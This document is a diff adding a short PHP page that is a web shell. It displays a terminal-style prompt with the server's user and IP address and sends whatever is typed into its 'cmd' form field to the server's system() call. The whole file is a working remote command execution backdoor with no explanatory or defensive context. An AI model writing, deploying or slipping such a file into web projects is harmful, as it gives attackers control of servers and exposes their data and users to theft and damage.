@@ -1,0 +1,16 @@
+<html>
+<body>
+<?php $svrip = $_SERVER['SERVER_ADDR'];?>
+<form method="POST" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<?=`whoami`."@".$svrip.":~$"?> <input type="text" name="cmd" autofocus id="cmd" size="50"><input type="submit" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_POST['cmd']))
+    {
+        system(htmlspecialchars($_POST['cmd']));
+    }
+?>
+</pre>
+</body>
+</html>
